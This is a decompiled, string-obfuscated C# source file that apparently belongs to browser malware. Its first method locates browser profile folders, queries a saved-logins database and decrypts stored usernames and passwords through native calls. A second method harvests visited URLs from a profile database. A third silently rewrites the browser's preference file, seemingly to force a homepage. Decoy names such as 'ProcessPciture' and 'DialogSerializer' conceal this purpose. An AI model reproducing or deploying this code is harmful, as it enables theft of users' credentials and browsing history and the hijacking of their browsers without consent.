using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace iexprorer;

internal sealed class ClientLayout
{
	public static List<ConnectionLayout> ProcessPciture()
	{
		List<ConnectionLayout> list = new List<ConnectionLayout>();
		Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		IEnumerator enumerator = null;
		IEnumerator enumerator2 = null;
		bool flag = false;
		string path = Icon.DeployStream() + _003CModule_003E.smethod_0("؉\u0618غدؼععشٵ\u0613ؼاذسغح؉", 1621);
		if (!Directory.Exists(path))
		{
			return list;
		}
		if (!Directory.Exists(Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("\u0fe5\u0ff4\u0ff4\u0fe0\u0fe5\u0ff0\u0fe5", 4004)) + _003CModule_003E.smethod_0("⚓⚂⚠⚵⚦⚣⚣⚮⚓⚉⚦⚽⚪⚩⚠⚷⚓⚟⚽⚠⚩⚦⚣⚪⚼", 9935)))
		{
			return list;
		}
		string text = null;
		string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("ˁːː\u02c4ˁ\u02d4ˁ", 640)) + _003CModule_003E.smethod_0("ӿӮӌәӊӏӏӂӿӥӊӑӆӅӌӛӿӳӑӌӅӊӏӆӐ", 1187));
		foreach (string text2 in directories)
		{
			text = text2;
			if (flag)
			{
				break;
			}
			string text3 = null;
			string[] files = Directory.GetFiles(text);
			foreach (string text4 in files)
			{
				text3 = text4;
				if (flag)
				{
					break;
				}
				if (Regex.IsMatch(text3, _003CModule_003E.smethod_0("ӬӶӸӱӰӱӬұӬӮӳӶӫӺ", 1183)))
				{
					DialogSerializer.ProcessPciture(text);
					DialogSerializer.valuesMap = text3;
				}
			}
		}
		string valuesMap = DialogSerializer.valuesMap;
		DialogSerializer.ContextList contextList_ = default(DialogSerializer.ContextList);
		DialogSerializer.ContextList contextList_2 = default(DialogSerializer.ContextList);
		TextFileDesigner textFileDesigner = new TextFileDesigner(valuesMap);
		DataTable dataTable = textFileDesigner.ProcessPciture(_003CModule_003E.smethod_0("ҦҰҹҰҶҡӕӟӕҳҧҺҸӕҘҚҏҪҙҚҒҜқ\u0486ӎ", 1269));
		DataTable dataTable2 = textFileDesigner.ProcessPciture(_003CModule_003E.smethod_0("ⓗⓁⓈⓁⓇⓐ⒤⒮⒤ⓂⓖⓋⓉ⒤ⓩ⓫⓾ⓛⓠ⓭⓷ⓥⓦⓨⓡⓠⓌ⓫⓷⓰⓷Ⓙ", 9348));
		try
		{
			enumerator = dataTable2.Rows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				_ = (DataRow)enumerator.Current;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		DialogSerializer.ProcessPciture(DialogSerializer.ProcessPciture(), bool_0: true, 0L);
		try
		{
			enumerator2 = dataTable.Rows.GetEnumerator();
			while (enumerator2.MoveNext())
			{
				ConnectionLayout connectionLayout = new ConnectionLayout();
				byte[] array = null;
				DataRow dataRow = (DataRow)enumerator2.Current;
				string text6 = (connectionLayout.LoadDeployment = Convert.ToString(dataRow[_003CModule_003E.smethod_0("ᗵᗼᗡᗾᗀᗦᗱᗾᗺᗧᗆᗁᗟ", 5523)].ToString()));
				StringBuilder stringBuilder = new StringBuilder(dataRow[_003CModule_003E.smethod_0("ᧈᧃ\u19ce᧟᧔\u19dd᧙ᧈᧉ᧸᧞ᧈ᧟ᧃ\u19ccᧀᧈ", 6573)].ToString());
				int value = DialogSerializer.ProcessPciture(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
				IntPtr ptr = new IntPtr(value);
				DialogSerializer.ContextList contextList_3 = (DialogSerializer.ContextList)Marshal.PtrToStructure(ptr, typeof(DialogSerializer.ContextList));
				if (DialogSerializer.ProcessPciture(ref contextList_3, ref contextList_, 0) == 0 && contextList_.activeGenerator != 0)
				{
					array = new byte[contextList_.activeGenerator - 1 + 1];
					ptr = new IntPtr(contextList_.valuesSet);
					Marshal.Copy(ptr, array, 0, contextList_.activeGenerator);
					connectionLayout.ProcessPciture = Encoding.ASCII.GetString(array);
				}
				StringBuilder stringBuilder2 = new StringBuilder(dataRow[_003CModule_003E.smethod_0("ڰڻڶڧڬڥڡڰڱڅڴڦڦڢںڧڱ", 1749)].ToString());
				int value2 = DialogSerializer.ProcessPciture(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
				ptr = new IntPtr(value2);
				DialogSerializer.ContextList contextList_4 = (DialogSerializer.ContextList)Marshal.PtrToStructure(ptr, typeof(DialogSerializer.ContextList));
				if (DialogSerializer.ProcessPciture(ref contextList_4, ref contextList_2, 0) == 0 && contextList_2.activeGenerator != 0)
				{
					array = new byte[contextList_2.activeGenerator - 1 + 1];
					ptr = new IntPtr(contextList_2.valuesSet);
					Marshal.Copy(ptr, array, 0, contextList_2.activeGenerator);
					Encoding.ASCII.GetString(array);
					connectionLayout.ResolveView = Encoding.ASCII.GetString(array);
				}
				list.Add(connectionLayout);
			}
			return list;
		}
		finally
		{
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	public static List<string> ProcessPciture()
	{
		List<string> list = new List<string>();
		string text = Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("Ҕ\u0485\u0485ґҔҁҔ", 1237)) + _003CModule_003E.smethod_0("ӸөӋӞӍӈӈӅӸӢӍӖӁӂӋӜӸӴӖӋӂӍӈӁӗ", 1188);
		string string_ = text;
		if (!Directory.Exists(text))
		{
			return list;
		}
		string[] directories = Directory.GetDirectories(text);
		foreach (string text2 in directories)
		{
			string[] files = Directory.GetFiles(text2);
			foreach (string text3 in files)
			{
				if (Path.GetFileName(text3) == _003CModule_003E.smethod_0("ชถปนฟฉ๔ฉซถณฎฟ", 3706))
				{
					text = text2;
					string_ = text3;
				}
			}
		}
		DialogSerializer.ProcessPciture(text);
		TextFileDesigner textFileDesigner = new TextFileDesigner(string_);
		DataTable dataTable = textFileDesigner.ProcessPciture(_003CModule_003E.smethod_0("ᑗᑁᑈᑁᑇᑐᐤᐮᐤᑂᑖᑋᑉᐤᑩᑫᑾᑛᑴᑨᑥᑧᑡᑷ", 5124));
		foreach (DataRow row in dataTable.Rows)
		{
			list.Add(row[_003CModule_003E.smethod_0("ඊඍඓ", 3583)].ToString());
		}
		return list;
	}

	public static void ProcessPciture(string string_0)
	{
		string text = Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("ḥḴḴḠḥḰḥ", 7780)) + _003CModule_003E.smethod_0("ᑸᑩᑋᑞᑍᑈᑈᑅᑸᑢᑍᑖᑁᑂᑋᑜᑸᑴᑖᑋᑂᑍᑈᑁᑗ", 5156);
		string path = text;
		if (!Directory.Exists(text))
		{
			return;
		}
		string[] directories = Directory.GetDirectories(text);
		foreach (string text2 in directories)
		{
			string[] files = Directory.GetFiles(text2);
			foreach (string text3 in files)
			{
				if (Path.GetFileName(text3) == _003CModule_003E.smethod_0("᭸᭺\u1b6d\u1b6e᭻ᬦ᭢᭻", 6920))
				{
					text = text2;
					path = text3;
				}
			}
		}
		string text4 = File.ReadAllText(path);
		text4 = text4.Replace(Regex.Match(text4, _003CModule_003E.smethod_0("ɸɾɨɿɒɽɿɨɫɑȥȯɯɿɢɺɾɨɿɑȣɾɹɬɿɹɸɽɑȣɥɢɠɨɽɬɪɨȯȡȭȯȣȧȲȯɑȤȶ", 525)).ToString(), string.Format(_003CModule_003E.smethod_0("ᴝᴛᴍᴚᴷᴘᴚᴍᴎᵀᵊᴊᴚᴇᴟᴛᴍᴚᵆᴛᴜᴉᴚᴜᴝᴘᵆᴀᴇᴅᴍᴘᴉᴏᴍᵊᵄᵈᵊᴓᵘᴕᵊᵁᵓ", 7528), string_0));
		try
		{
			File.WriteAllText(path, text4);
		}
		catch (Exception)
		{
		}
	}
}
